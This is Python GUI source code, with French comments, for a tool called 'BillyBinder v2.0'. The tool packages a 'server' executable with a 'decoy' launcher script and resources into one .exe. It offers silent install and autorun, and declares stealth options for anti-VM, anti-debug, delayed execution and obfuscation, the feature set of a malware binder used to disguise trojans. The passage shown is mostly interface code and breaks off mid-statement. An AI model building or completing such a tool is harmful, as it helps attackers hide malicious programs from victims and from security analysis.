
LANCER LE .EXE CECI EST SEULEMENT LE CODE SOURCE !!!



import customtkinter as ctk
from tkinter import filedialog, messagebox
import tkinter as tk
import base64
import os
import subprocess
import shutil
import sys
import tarfile
import json
import datetime
import math
import random
import threading

# ─────────────────────────────────────────────
#  THEME  —  Cyber-Minimalisme / AXIOM PRO
# ─────────────────────────────────────────────
BG          = "#000000"
BG_CARD     = "#080c14"
BG_SIDEBAR  = "#050810"
BG_INPUT    = "#0a0e18"
BG_FIELD    = "#0d1520"

NEON_BLUE   = "#00bfff"
NEON_CYAN   = "#00ffff"
NEON_RED    = "#ef4444"
NEON_GREEN  = "#22c55e"
NEON_YELLOW = "#f59e0b"
NEON_ORANGE = "#f97316"

TXT_PRIMARY   = "#e2e8f0"
TXT_SECONDARY = "#4a6080"
TXT_DIM       = "#1e2d3d"

FONT_TITLE  = ("Consolas", 22, "bold")
FONT_LABEL  = ("Consolas", 10, "bold")
FONT_SMALL  = ("Consolas", 9)
FONT_MONO   = ("Consolas", 9)
FONT_BTN    = ("Consolas", 14, "bold")

ctk.set_appearance_mode("dark")
ctk.set_default_color_theme("blue")


# ── BOUTON ANIME CYBER — effet hover doux ──
class CyberButton(ctk.CTkButton):
    def __init__(self, *args, glow_color=NEON_BLUE, hover_glow_color=NEON_CYAN, **kwargs):
        self._glow_color      = glow_color
        self._hover_glow      = hover_glow_color
        self._base_fg         = kwargs.get("fg_color", BG_FIELD)
        self._base_hover      = kwargs.get("hover_color", "#0d1f35")
        self._base_bd_color   = kwargs.get("border_color", NEON_BLUE)
        super().__init__(*args, **kwargs)

        # Track animation state
        self._glow_strength = 0  # from 0 (no glow) to 1 (max glow)
        self._glow_direction = None

        self.bind("<Enter>", self._start_glow)
        self.bind("<Leave>", self._end_glow)
        # For ctk.Button internals
        self._is_animating = False

    def _start_glow(self, event=None):
        if self._is_animating: return
        self._is_animating = True
        self._glow_direction = 1
        self._animate_glow()

    def _end_glow(self, event=None):
        self._glow_direction = -1
        self._animate_glow()

    def _animate_glow(self):
        # Smoothly interpolate glow
        step = 0.09
        max_glow = 0.5  # controls glow alpha on hover

        if self._glow_direction == 1 and self._glow_strength < max_glow:
            self._glow_strength += step
            if self._glow_strength > max_glow:
                self._glow_strength = max_glow
            self._update_glow()
            self.after(18, self._animate_glow)
        elif self._glow_direction == -1 and self._glow_strength > 0:
            self._glow_strength -= step
            if self._glow_strength < 0:
                self._glow_strength = 0
            self._update_glow()
            self.after(18, self._animate_glow)
        else:
            if self._glow_direction == -1:
                self._is_animating = False

    def _update_glow(self):
        def _to_rgb(color):
            """Retourne (r,g,b) 0..255 pour n'importe quelle couleur Tk."""
            if color in (None, "", "transparent"):
                color = BG_FIELD
            try:
                # winfo_rgb retourne 0..65535
                r, g, b = self.winfo_rgb(color)
                return (r // 257, g // 257, b // 257)
            except Exception:
                # Fallback: tenter #RRGGBB
                try:
                    c = str(color).lstrip("#")
                    if len(c) >= 6:
                        return (int(c[0:2], 16), int(c[2:4], 16), int(c[4:6], 16))
                except Exception:
                    pass
            return (13, 21, 32)  # BG_FIELD approx

        def mix(cl1, cl2, f):
            r1, g1, b1 = _to_rgb(cl1)
            r2, g2, b2 = _to_rgb(cl2)
            t = max(0.0, min(1.0, float(f) * 2))
            r = int(r1 + (r2 - r1) * t)
            g = int(g1 + (g2 - g1) * t)
            b = int(b1 + (b2 - b1) * t)
            return f"#{r:02x}{g:02x}{b:02x}"

        # Change border color and fg color for glow effect, keep rest
        hoverc = mix(self._base_fg, self._hover_glow, self._glow_strength)
        borderc = mix(self._base_bd_color, self._hover_glow, self._glow_strength)
        self.configure(fg_color=hoverc, border_color=borderc)

# ── PROGRESSBAR AVEC GLOW CYBER ──
class GlowProgressBar(tk.Canvas):
    """ProgressBar custom avec lueur bleue."""
    def __init__(self, parent, width=320, height=12, bg=BG_FIELD, glow=NEON_BLUE, **kwargs):
        super().__init__(parent, width=width, height=height, bg=bg, bd=0, highlightthickness=0, **kwargs)
        # IMPORTANT: ne pas utiliser self._w (réservé à Tkinter: nom du widget)
        self._cw, self._ch = width, height
        self._progress = 0.0
        self._mode = "indeterminate"     # "indeterminate" or "determinate"
        self._glow_color = glow
        self._bar_color = NEON_BLUE
        self._bg_field = bg
        self._anim = False
        self._indet_pos = 0
        self._glow_phase = 0
        self._bar_id = None
        self._glow_id = None
        self._draw()
    def _draw(self):
        self.delete("all")
        # Draw BG
        self.create_rectangle(0, 0, self._cw, self._ch, fill=self._bg_field, outline="")
        # Bar
        if self._mode == "determinate":
            fillw = int(self._cw * self._progress)
            if fillw > 0:
                self.create_rectangle(0, 0, fillw, self._ch, fill=self._bar_color, outline="")
                # Glow
                for i in range(7):
                    alpha = max(0, 60 - i * 10)
                    color = self._glow_color + f"{alpha:02x}"
                    self.create_rectangle(0, -i, fillw, self._ch + i, fill=self._glow_color, outline="", stipple="gray50")
        else:
            # Indeterminate: moving bar
            width = int(self._cw*0.23)
            pos = int(self._indet_pos)
            self.create_rectangle(pos, 0, pos + width, self._ch, fill=self._bar_color, outline="")
            # Animated blue glow wide area around bar
            for i in range(4):
                alpha = 80 - i*13
                color = self._glow_color + f"{alpha:02x}"
                self.create_rectangle(pos-i*2, -i, pos+width+i*2, self._ch+i, fill=self._glow_color, outline="", stipple="gray50")
    def set(self, value):
        """0..1 for determinate. Triggers redraw."""
        self._progress = max(0, min(1, float(value)))
        self._draw()
    def start(self, mode=None):
        if mode is not None:
            self._mode = mode
        self._anim = True
        self._step_indet()
    def stop(self):
        self._anim = False
    def _step_indet(self):
        if not self._anim: return
        speed = max(1, int(self._cw/33))
        self._indet_pos = (self._indet_pos + speed) % (self._cw-int(self._cw*0.25))
        self._draw()
        self.after(23, self._step_indet)
    def set_mode(self, mode):
        self._mode = mode
        self._draw()
    def configure(self, **kwargs):
        if "progress_color" in kwargs:
            self._bar_color = kwargs.pop("progress_color")
        if "glow_color" in kwargs:
            self._glow_color = kwargs.pop("glow_color")
        if "fg_color" in kwargs:
            self._bg_field = kwargs.pop("fg_color")
        super().configure(**kwargs)
        self._draw()


# ─────────────────────────────────────────────
#  WIDGET CANVAS — Moniteur CPU/RAM
# ─────────────────────────────────────────────
class MiniMonitor(tk.Canvas):
    """Graphique de type oscilloscope en temps reel pour CPU et RAM."""
    def __init__(self, parent, width=180, height=60, **kwargs):
        super().__init__(parent, width=width, height=height,
                         bg=BG_CARD, highlightthickness=0, **kwargs)
        self._cw = width
        self._ch = height
        self._cpu_vals = [0.0] * 40
        self._ram_vals = [0.0] * 40
        self._running  = False
        self._is_compiling = False
        self._draw()

    def start(self):
        self._running = True
        self._is_compiling = True
        self._tick()

    def stop(self):
        self._is_compiling = False

    def destroy_monitor(self):
        self._running = False
        self.destroy()

    def _tick(self):
        if not self._running:
            return
        if self._is_compiling:
            cpu = min(100, self._cpu_vals[-1] + random.uniform(-8, 18))
            ram = min(100, self._ram_vals[-1] + random.uniform(-3, 8))
        else:
            cpu = max(2, self._cpu_vals[-1] + random.uniform(-12, 6))
            ram = max(15, self._ram_vals[-1] + random.uniform(-5, 3))

        self._cpu_vals.append(max(0, min(100, cpu)))
        self._ram_vals.append(max(0, min(100, ram)))
        self._cpu_vals = self._cpu_vals[-40:]
        self._ram_vals = self._ram_vals[-40:]
        self._draw()
        self.after(120, self._tick)

    def _draw(self):
        self.delete("all")
        # Fond grille
        for i in range(1, 4):
            y = int(self._ch * i / 4)
            self.create_line(0, y, self._cw, y, fill="#0d1a2a", dash=(2, 4))

        def draw_line(vals, color):
            n = len(vals)
            if n < 2:
                return
            step = self._cw / (n - 1)
            pts = []
            for i, v in enumerate(vals):
                x = int(i * step)
                y = int(self._ch - (v / 100) * (self._ch - 4) - 2)
                pts.extend([x, y])
            self.create_line(*pts, fill=color, width=1, smooth=True)

        draw_line(self._ram_vals, "#1a6030")
        draw_line(self._cpu_vals, NEON_BLUE)

        # Valeurs actuelles
        cpu_now = int(self._cpu_vals[-1])
        ram_now = int(self._ram_vals[-1])
        self.create_text(4, 4, text=f"CPU {cpu_now}%",
                         fill=NEON_BLUE, font=("Consolas", 7), anchor="nw")
        self.create_text(4, 14, text=f"RAM {ram_now}%",
                         fill=NEON_GREEN, font=("Consolas", 7), anchor="nw")


# ─────────────────────────────────────────────
#  WIDGET CANVAS — Graphique circulaire (donut)
# ─────────────────────────────────────────────
class DonutChart(tk.Canvas):
    """Graphique donut pour la repartition de la taille du package."""
    def __init__(self, parent, width=200, height=200, **kwargs):
        super().__init__(parent, width=width, height=height,
                         bg=BG_CARD, highlightthickness=0, **kwargs)
        self._cw = width
        self._ch = height
        self._data = []
        self._draw_empty()

    def set_data(self, data):
        """data = [(label, valeur, couleur), ...]"""
        self._data = data
        self._draw()

    def _draw_empty(self):
        self.delete("all")
        cx, cy = self._cw // 2, self._ch // 2
        r = min(cx, cy) - 20
        self.create_oval(cx - r, cy - r, cx + r, cy + r,
                         outline=TXT_DIM, width=1, fill=BG_CARD)
        self.create_oval(cx - r // 2, cy - r // 2,
                         cx + r // 2, cy + r // 2,
                         outline=BG_CARD, fill=BG_CARD)
        self.create_text(cx, cy, text="—", fill=TXT_DIM,
                         font=("Consolas", 11, "bold"))

    def _draw(self):
        if not self._data:
            self._draw_empty()
            return
        self.delete("all")
        cx, cy = self._cw // 2, self._ch // 2
        r_outer = min(cx, cy) - 20
        r_inner = r_outer // 2

        total = sum(v for _, v, _ in self._data)
        if total == 0:
            self._draw_empty()
            return

        start = -90.0
        for label, value, color in self._data:
            extent = 360.0 * value / total
            self.create_arc(cx - r_outer, cy - r_outer,
                            cx + r_outer, cy + r_outer,
                            start=start, extent=extent,
                            fill=color, outline=BG_CARD, width=2, style="pieslice")
            start += extent

        # Trou central
        self.create_oval(cx - r_inner, cy - r_inner,
                         cx + r_inner, cy + r_inner,
                         fill=BG_CARD, outline=BG_CARD)

        # Legende
        legend_y = 6
        for label, value, color in self._data:
            pct = int(100 * value / total)
            self.create_rectangle(4, legend_y, 12, legend_y + 8,
                                  fill=color, outline="")
            self.create_text(16, legend_y + 4, text=f"{label}  {pct}%",
                             fill=TXT_PRIMARY, font=("Consolas", 7), anchor="w")
            legend_y += 14


# ─────────────────────────────────────────────
#  APPLICATION PRINCIPALE
# ─────────────────────────────────────────────
class AxiomDeployPro(ctk.CTk):
    def __init__(self):
        super().__init__()
        self.title("BillyBinder  v2.0")
        self.geometry("860x820")
        self.resizable(False, False)
        self.configure(fg_color=BG)

        self.server_path     = ctk.StringVar()
        self.decoy_path      = ctk.StringVar()
        self.src_folder_path = ctk.StringVar()
        self.icon_path       = ctk.StringVar()
        self.output_exe_name = ctk.StringVar()

        # Options de deploiement
        self.opt_silent    = ctk.BooleanVar(value=True)
        self.opt_autorun   = ctk.BooleanVar(value=False)
        self.opt_priority  = ctk.BooleanVar(value=False)

        # Options stealth
        self.opt_anti_vm      = ctk.BooleanVar(value=False)
        self.opt_anti_debug   = ctk.BooleanVar(value=False)
        self.opt_delay_exec   = ctk.BooleanVar(value=False)
        self.opt_obfuscation  = ctk.BooleanVar(value=False)
        self.delay_seconds    = ctk.StringVar(value="5")

        # Preferences
        self.pref_nettoyer  = ctk.BooleanVar(value=True)
        self.pref_journal   = ctk.BooleanVar(value=True)

        # Etat interne
        self.active_tab      = 0
        self.sidebar_btns    = []
        self.project_history = []
        self.all_logs        = []

        # Auto-scroll : True = suit la fin, False = l'utilisateur est en train de lire
        self._terminal_autoscroll = True

        # Sauvegarde auto (config.json)
        self.protocol("WM_DELETE_WINDOW", self._on_close)
        self._load_config()

        self._build_ui()

    def _config_path(self) -> str:
        return os.path.join(os.path.dirname(os.path.abspath(__file__)), "config.json")

    def _load_config(self):
        """Recharge les chemins sauvegardés si config.json existe."""
        path = self._config_path()
        if not os.path.exists(path):
            return
        try:
            with open(path, "r", encoding="utf-8") as f:
                cfg = json.load(f) or {}
            server = cfg.get("server_path")
            decoy = cfg.get("decoy_path")
            icon = cfg.get("icon_path")
            out_name = cfg.get("output_exe_name")
            if isinstance(server, str):
                self.server_path.set(server)
            if isinstance(decoy, str):
                self.decoy_path.set(decoy)
            if isinstance(icon, str):
                self.icon_path.set(icon)
            if isinstance(out_name, str):
                self.output_exe_name.set(out_name)
        except Exception:
            # Si le fichier est corrompu ou illisible, on ignore silencieusement.
            pass

    def _save_config(self):
        """Sauvegarde les chemins dans config.json."""
        path = self._config_path()
        cfg = {
            "server_path": self.server_path.get(),
            "decoy_path": self.decoy_path.get(),
            "icon_path": self.icon_path.get(),
            "output_exe_name": self.output_exe_name.get(),
        }
        try:
            with open(path, "w", encoding="utf-8") as f:
                json.dump(cfg, f, ensure_ascii=False, indent=2)
        except Exception:
            pass

    def _sanitize_exe_name(self, name: str) -> str:
        """Nettoie un nom d'exe Windows (sans extension)."""
        n = (name or "").strip()
        if n.lower().endswith(".exe"):
            n = n[:-4].strip()
        # Caractères interdits sous Windows: <>:"/\|?*
        for ch in '<>:"/\\|?*':
            n = n.replace(ch, "")
        n = n.strip().strip(".")
        return n[:80]

    def _on_close(self):
        """Hook fermeture fenêtre : sauvegarde puis ferme."""
        self._save_config()
        self.destroy()

    # ─── LAYOUT PRINCIPAL ─────────────────────
    def _build_ui(self):
        root = ctk.CTkFrame(self, fg_color=BG, corner_radius=0)
        root.pack(fill="both", expand=True)

        self._build_sidebar(root)

        self.content_area = ctk.CTkFrame(root, fg_color=BG, corner_radius=0)
        self.content_area.pack(side="left", fill="both", expand=True)

        self.panels = {}
        self.panels[0] = self._build_panel_deploiement(self.content_area)
        self.panels[1] = self._build_panel_projets(self.content_area)
        self.panels[2] = self._build_panel_journaux(self.content_area)
        self.panels[3] = self._build_panel_parametres(self.content_area)

        self._switch_tab(0)

    # ─── BARRE LATERALE ───────────────────────
    def _build_sidebar(self, parent):
        sb = ctk.CTkFrame(parent, width=62, fg_color=BG_SIDEBAR, corner_radius=0)
        sb.pack(side="left", fill="y")
        sb.pack_propagate(False)

        logo = ctk.CTkLabel(sb, text="AX", font=("Consolas", 13, "bold"),
                            text_color=NEON_BLUE, fg_color=BG_CARD,
                            width=36, height=36, corner_radius=6)
        logo.pack(pady=(18, 20))

        # Tooltips (labels, index)
        tabs = [
            ("⊞", 0, "Deploiement"),
            ("⊡", 1, "Projets"),
            ("≡", 2, "Journaux"),
            ("⊗", 3, "Parametres"),
        ]
        for icon, idx, _ in tabs:
            btn = CyberButton(sb, text=icon, width=36, height=36,
                                fg_color="transparent",
                                hover_color="#0a1628",
                                text_color=TXT_SECONDARY,
                                font=("Consolas", 16), corner_radius=6,
                                border_color=BG_SIDEBAR,
                                glow_color=NEON_BLUE, hover_glow_color=NEON_CYAN,
                                command=lambda i=idx: self._switch_tab(i))
            btn.pack(pady=4)
            self.sidebar_btns.append(btn)

        # Separateur
        sep = ctk.CTkFrame(sb, height=1, fg_color=TXT_DIM)
        sep.pack(fill="x", padx=8, pady=12)

        # Mini-moniteur CPU/RAM
        monitor_label = ctk.CTkLabel(sb, text="SYS", font=("Consolas", 7),
                                     text_color=TXT_DIM)
        monitor_label.pack()

        monitor_container = tk.Frame(sb, bg=BG_SIDEBAR, bd=0, highlightthickness=0)
        monitor_container.pack(pady=(2, 0))

        self.mini_monitor = MiniMonitor(monitor_container, width=46, height=40)
        self.mini_monitor.pack()
        self.mini_monitor._running = True
        self.mini_monitor._tick()

        # Statut en bas
        ctk.CTkLabel(sb, text="•", text_color=TXT_DIM,
                     font=("Consolas", 20)).pack(side="bottom", pady=20)

    def _switch_tab(self, index):
        self.active_tab = index
        for i, btn in enumerate(self.sidebar_btns):
            if i == index:
                btn.configure(fg_color=BG_CARD, text_color=NEON_BLUE)
            else:
                btn.configure(fg_color="transparent", text_color=TXT_SECONDARY)
        for panel in self.panels.values():
            panel.pack_forget()
        self.panels[index].pack(fill="both", expand=True)
        if index == 2:
            self._refresh_journaux()

    # ─── HEADER ───────────────────────────────
    def _build_header(self, parent, titre, sous_titre=""):
        bar = ctk.CTkFrame(parent, height=52, fg_color=BG_CARD, corner_radius=0)
        bar.pack(fill="x")
        bar.pack_propagate(False)

        ctk.CTkLabel(bar, text=titre, font=FONT_TITLE,
                     text_color=NEON_BLUE).pack(side="left", padx=20)

        if sous_titre:
            ctk.CTkLabel(bar, text=sous_titre, font=FONT_SMALL,
                         text_color=TXT_SECONDARY).pack(side="left", padx=6, pady=18)

        pill = ctk.CTkFrame(bar, fg_color="#0d1f0d", corner_radius=20)
        pill.pack(side="right", padx=20, pady=12)
        ctk.CTkLabel(pill, text="● PRET", font=FONT_SMALL,
                     text_color=NEON_GREEN).pack(padx=12, pady=0)

        return bar

    def _section_label(self, parent, texte):
        row = ctk.CTkFrame(parent, fg_color="transparent")
        row.pack(fill="x", padx=20, pady=(18, 4))
        ctk.CTkLabel(row, text=texte, font=FONT_LABEL, text_color=NEON_BLUE).pack(side="left")
        sep = ctk.CTkFrame(row, height=1, fg_color=TXT_DIM)
        sep.pack(side="left", fill="x", expand=True, padx=(10, 0), pady=1)

    # ══════════════════════════════════════════
    #  PANNEAU 0 — DEPLOIEMENT
    # ══════════════════════════════════════════
    def _build_panel_deploiement(self, parent):
        panel = ctk.CTkFrame(parent, fg_color=BG, corner_radius=0)

        self._build_header(panel, "BillyBinder")

        scroll = ctk.CTkScrollableFrame(panel, fg_color=BG,
                                        scrollbar_button_color=TXT_DIM,
                                        scrollbar_button_hover_color=NEON_BLUE,
                                        corner_radius=0)
        scroll.pack(fill="both", expand=True)

        self._section_label(scroll, "[ SLOTS DE CHARGE UTILE ]")
        self._build_slots(scroll)

        self._section_label(scroll, "[ OPTIONS DE DEPLOIEMENT ]")
        self._build_options(scroll)

        self._section_label(scroll, "[ ICONE DU PACKAGE ]")
        self._build_icon_slot(scroll)

        self._build_action(scroll)

        # Graphique repartition du package
        self._section_label(scroll, "[ REPARTITION DU PACKAGE ]")
        self._build_donut_section(scroll)

        self._section_label(scroll, "[ SORTIE DE COMPILATION ]")
        self._build_terminal(scroll)

        return panel

    # ─── SLOTS ────────────────────────────────
    def _build_slots(self, parent):
        slots_frame = ctk.CTkFrame(parent, fg_color="transparent")
        slots_frame.pack(fill="x", padx=20, pady=(0, 4))

        slots_cfg = [
            ("A", "EXECUTABLE PRINCIPAL", "⬡", self.server_path, "file",
             "Fichier serveur  (.exe)"),
            ("B", "SCRIPT D'AUTOMATISATION", "⟨/⟩", self.decoy_path, "file",
             "Lanceur  (.bat / .cmd)"),
            ("C", "RESSOURCES", "⊞", self.src_folder_path, "dir",
             "Dossier  'src'"),
        ]
        for tag, title, icon, var, browse_type, hint in slots_cfg:
            self._slot_card(slots_frame, tag, title, icon, var, browse_type, hint)

    def _slot_card(self, parent, tag, title, icon, var, browse_type, hint):
        card = ctk.CTkFrame(parent, fg_color=BG_CARD, corner_radius=6,
                            border_width=1, border_color=TXT_DIM)
        card.pack(fill="x", pady=5)

        top = ctk.CTkFrame(card, fg_color="transparent")
        top.pack(fill="x", padx=14, pady=(10, 0))
        ctk.CTkLabel(top, text=f"[{tag}]", font=FONT_LABEL,
                     text_color=NEON_CYAN, width=30).pack(side="left")
        ctk.CTkLabel(top, text=title, font=FONT_LABEL,
                     text_color=TXT_PRIMARY).pack(side="left", padx=6)
        ctk.CTkLabel(top, text=icon, font=("Consolas", 16),
                     text_color=TXT_DIM).pack(side="right")

        ctk.CTkLabel(card, text=hint, font=FONT_SMALL,
                     text_color=TXT_SECONDARY).pack(anchor="w", padx=14, pady=(2, 6))

        row = ctk.CTkFrame(card, fg_color=BG_INPUT, corner_radius=4)
        row.pack(fill="x", padx=14, pady=(0, 12))

        entry = ctk.CTkEntry(row, textvariable=var, fg_color="transparent",
                             border_width=0, text_color=TXT_PRIMARY,
                             font=FONT_MONO, placeholder_text="— deposer ou parcourir —",
                             placeholder_text_color=TXT_DIM)
        entry.pack(side="left", fill="x", expand=True, padx=10, pady=6)

        btn = CyberButton(row, text="Parcourir", width=80, height=28,
                            fg_color=BG_FIELD, hover_color="#0d1f35",
                            text_color=NEON_BLUE, font=FONT_LABEL,
                            corner_radius=4, border_width=1,
                            border_color=NEON_BLUE,
                            glow_color=NEON_BLUE, hover_glow_color=NEON_CYAN,
                            command=lambda v=var, t=browse_type: self._browse(v, t))
        btn.pack(side="right", padx=8, pady=6)

    # ─── OPTIONS ──────────────────────────────
    def _build_options(self, parent):
        card = ctk.CTkFrame(parent, fg_color=BG_CARD, corner_radius=6,
                            border_width=1, border_color=TXT_DIM)
        card.pack(fill="x", padx=20, pady=(0, 4))

        toggles = [
            ("Installation silencieuse", self.opt_silent,
             "Supprime toute interface pendant l'installation"),
            ("Demarrage automatique", self.opt_autorun,
             "Lance automatiquement apres extraction"),
            ("Haute priorite", self.opt_priority,
             "Priorite CPU elevee au lancement"),
        ]
        for label, var, desc in toggles:
            self._toggle_row(card, label, var, desc)

    def _toggle_row(self, parent, label, var, desc, color=NEON_BLUE):
        r = ctk.CTkFrame(parent, fg_color="transparent")
        r.pack(fill="x", padx=14, pady=6)

        text_col = ctk.CTkFrame(r, fg_color="transparent")
        text_col.pack(side="left", fill="x", expand=True)
        ctk.CTkLabel(text_col, text=label, font=FONT_LABEL,
                     text_color=TXT_PRIMARY).pack(anchor="w")
        ctk.CTkLabel(text_col, text=desc, font=FONT_SMALL,
                     text_color=TXT_SECONDARY).pack(anchor="w")

        sw = ctk.CTkSwitch(r, variable=var, text="",
                           progress_color=color,
                           button_color=NEON_CYAN if color == NEON_BLUE else NEON_YELLOW,
                           button_hover_color=color,
                           fg_color=TXT_DIM,
                           width=46, height=22)
        sw.pack(side="right", padx=4)

        sep = ctk.CTkFrame(parent, height=1, fg_color=TXT_DIM)
        sep.pack(fill="x", padx=14)

    # ─── ICONE ────────────────────────────────
    def _build_icon_slot(self, parent):
        card = ctk.CTkFrame(parent, fg_color=BG_CARD, corner_radius=6,
                            border_width=1, border_color=TXT_DIM)
        card.pack(fill="x", padx=20, pady=(0, 4))

        row = ctk.CTkFrame(card, fg_color=BG_INPUT, corner_radius=4)
        row.pack(fill="x", padx=14, pady=12)

        ctk.CTkLabel(row, text="Icone (.ico)", font=FONT_LABEL,
                     text_color=TXT_SECONDARY, width=100).pack(side="left", padx=10)

        ctk.CTkEntry(row, textvariable=self.icon_path, fg_color="transparent",
                     border_width=0, text_color=TXT_PRIMARY,
                     font=FONT_MONO, placeholder_text="— optionnel —",
                     placeholder_text_color=TXT_DIM).pack(side="left", fill="x", expand=True, padx=4)

        CyberButton(row, text="Parcourir", width=80, height=28,
                      fg_color=BG_FIELD, hover_color="#0d1f35",
                      text_color=NEON_BLUE, font=FONT_LABEL,
                      corner_radius=4, border_width=1,
                      border_color=NEON_BLUE,
                      glow_color=NEON_BLUE, hover_glow_color=NEON_CYAN,
                      command=lambda: self._browse(self.icon_path, "file")).pack(side="right", padx=8, pady=6)

    # ─── GRAPHIQUE DONUT ──────────────────────
    def _build_donut_section(self, parent):
        card = ctk.CTkFrame(parent, fg_color=BG_CARD, corner_radius=6,
                            border_width=1, border_color=TXT_DIM)
        card.pack(fill="x", padx=20, pady=(0, 4))

        donut_wrap = tk.Frame(card, bg=BG_CARD, bd=0, highlightthickness=0)
        donut_wrap.pack(pady=12)

        self.donut = DonutChart(donut_wrap, width=180, height=150)
        self.donut.pack()

        ctk.CTkLabel(card, text="Compile un package pour visualiser la repartition",
                     font=FONT_SMALL, text_color=TXT_DIM).pack(pady=(0, 10))

    def _update_donut(self, exe_size, script_size, src_size):
        data = [
            ("Executable", exe_size,  NEON_BLUE),
            ("Script",     script_size, NEON_CYAN),
            ("Ressources", src_size,  NEON_GREEN),
        ]
        if hasattr(self, "donut"):
            self.donut.set_data(data)

    # ─── BOUTON ACTION ────────────────────────
    def _build_action(self, parent):
        frame = ctk.CTkFrame(parent, fg_color="transparent")
        frame.pack(fill="x", padx=20, pady=(18, 0))

        self.btn_compile = CyberButton(
            frame, text=">>  GENERER LE PACKAGE  <<",
            command=self._start_compilation,
            height=50, font=FONT_BTN,
            fg_color=NEON_BLUE, hover_color=NEON_CYAN,
            glow_color=NEON_BLUE, hover_glow_color=NEON_CYAN,
            text_color=BG, corner_radius=6
        )
        self.btn_compile.pack(fill="x")

        # Nom de l'exe de sortie
        name_row = ctk.CTkFrame(frame, fg_color=BG_CARD, corner_radius=6,
                                border_width=1, border_color=TXT_DIM)
        name_row.pack(fill="x", pady=(10, 0))
        ctk.CTkLabel(name_row, text="Nom du .exe", font=FONT_LABEL,
                     text_color=TXT_SECONDARY, width=120, anchor="w").pack(side="left", padx=12, pady=10)
        ctk.CTkEntry(
            name_row, textvariable=self.output_exe_name,
            fg_color=BG_INPUT, border_color=TXT_DIM, border_width=1,
            text_color=TXT_PRIMARY, font=FONT_MONO,
            placeholder_text="(ex: MonPackage)",
            placeholder_text_color=TXT_DIM,
            height=30
        ).pack(side="left", fill="x", expand=True, padx=(0, 12), pady=10)

        self.progress = GlowProgressBar(frame, width=320, height=9,
                                        bg=BG_FIELD, glow=NEON_BLUE)
        # Le .pack() doit prendre la place horizontalement.
        self.progress.pack(fill="x", pady=(6, 0), padx=3)

        self.status_label = ctk.CTkLabel(frame, text="PRET  —  tous les systemes nominaux",
                                         font=FONT_SMALL, text_color=TXT_SECONDARY)
        self.status_label.pack(anchor="w", pady=(4, 0))

    # ─── TERMINAL (avec coloration + auto-scroll intelligent) ──
    def _build_terminal(self, parent):
        term_frame = ctk.CTkFrame(parent, fg_color=BG_CARD, corner_radius=6,
                                  border_width=1, border_color=TXT_DIM)
        term_frame.pack(fill="x", padx=20, pady=(0, 20))

        # Barre superieure du terminal
        term_bar = ctk.CTkFrame(term_frame, fg_color="transparent")
        term_bar.pack(fill="x", padx=10, pady=(8, 0))

        ctk.CTkLabel(term_bar, text="● STDOUT", font=("Consolas", 8, "bold"),
                     text_color=NEON_GREEN).pack(side="left", padx=4)
        ctk.CTkLabel(term_bar, text="● STDERR", font=("Consolas", 8, "bold"),
                     text_color=NEON_RED).pack(side="left", padx=4)
        ctk.CTkLabel(term_bar, text="● WARN", font=("Consolas", 8, "bold"),
                     text_color=NEON_YELLOW).pack(side="left", padx=4)

        # Indicateur auto-scroll
        self.autoscroll_indicator = ctk.CTkLabel(
            term_bar, text="↓ AUTO", font=("Consolas", 8, "bold"),
            text_color=NEON_BLUE
        )
        self.autoscroll_indicator.pack(side="right", padx=4)

        # Textbox avec tags de couleur (on utilise tk.Text sous-jacent)
        term_container = tk.Frame(term_frame, bg=BG_CARD, bd=0)
        term_container.pack(fill="x", padx=6, pady=6)

        self.terminal_tk = tk.Text(
            term_container, height=10, bg=BG_CARD, fg="#4ade80",
            font=("Consolas", 9), bd=0, highlightthickness=0,
            insertbackground=NEON_BLUE, wrap="word",
            relief="flat", state="disabled"
        )

        term_scroll = tk.Scrollbar(term_container, orient="vertical",
                                   command=self.terminal_tk.yview,
                                   bg=BG_CARD, troughcolor=BG_CARD,
                                   activebackground=NEON_BLUE,
                                   highlightthickness=0, bd=0)
        self.terminal_tk.configure(yscrollcommand=self._on_terminal_scroll)

        self.terminal_tk.pack(side="left", fill="x", expand=True)
        term_scroll.pack(side="right", fill="y")

        # Configurer les tags de couleur
        self.terminal_tk.tag_configure("success", foreground="#4ade80")   # vert neon
        self.terminal_tk.tag_configure("error",   foreground="#f87171")   # rouge brillant
        self.terminal_tk.tag_configure("warning", foreground="#fbbf24")   # jaune
        self.terminal_tk.tag_configure("info",    foreground="#38bdf8")   # bleu clair
        self.terminal_tk.tag_configure("dim",     foreground="#2a3a4a")   # gris
        self.terminal_tk.tag_configure("default", foreground="#4ade80")   # vert par defaut

        # Detecter quand l'utilisateur fait defiler manuellement
        self.terminal_tk.bind("<MouseWheel>", self._on_manual_scroll)
        self.terminal_tk.bind("<Button-4>",   self._on_manual_scroll)
        self.terminal_tk.bind("<Button-5>",   self._on_manual_scroll)

        self._log("BillyBinder  v2.0  — pret", "success")
        self._log("─" * 52, "dim")

    def _on_terminal_scroll(self, first, last):
        """Callback scroll : detecte si on est en bas."""
        if float(last) >= 0.99:
            self._terminal_autoscroll = True
            self.autoscroll_indicator.configure(text="↓ AUTO", text_color=NEON_BLUE)
        else:
            self._terminal_autoscroll = False
            self.autoscroll_indicator.configure(text="↑ PAUSE", text_color=TXT_SECONDARY)

    def _on_manual_scroll(self, event):
        """L'utilisateur scrolle manuellement — desactiver auto-scroll."""
        self.after(100, self._check_scroll_position)

    def _check_scroll_position(self):
        if not hasattr(self, "terminal_tk"):
            return
        try:
            pos = self.terminal_tk.yview()
            if pos[1] >= 0.99:
                self._terminal_autoscroll = True
                self.autoscroll_indicator.configure(text="↓ AUTO", text_color=NEON_BLUE)
            else:
                self._terminal_autoscroll = False
                self.autoscroll_indicator.configure(text="↑ PAUSE", text_color=TXT_SECONDARY)
        except Exception:
            pass

    def _detect_tag(self, msg: str) -> str:
        """Choisir le tag de couleur selon le contenu du message."""
        m = msg.lower()
        if any(k in m for k in ["erreur", "error", "exception", "echec", "failed", "fatal", "[erreur]", "[exception]"]):
            return "error"
        if any(k in m for k in ["avertissement", "warning", "warn", "attention"]):
            return "warning"
        if any(k in m for k in ["succes", "success", "ok", "termine", "genere", "compile", "pret"]):
            return "success"
        if any(k in m for k in [">>", "[slot", "[info", "lancement", "encodage", "initialisation"]):
            return "info"
        if msg.startswith("─") or msg.strip() == "":
            return "dim"
        return "default"

    def _log(self, msg, tag=None):
        horodatage = datetime.datetime.now().strftime("%H:%M:%S")
        entree = f"[{horodatage}]  {msg}"
        self.all_logs.append(entree)

        if hasattr(self, "terminal_tk"):
            self.terminal_tk.configure(state="normal")
            line = f"  {msg}\n"

            # Couleurs demandées pour les tags textuels.
            # (Les tags tk.Text sont déjà configurés dans _build_terminal.)
            token_to_tag = {
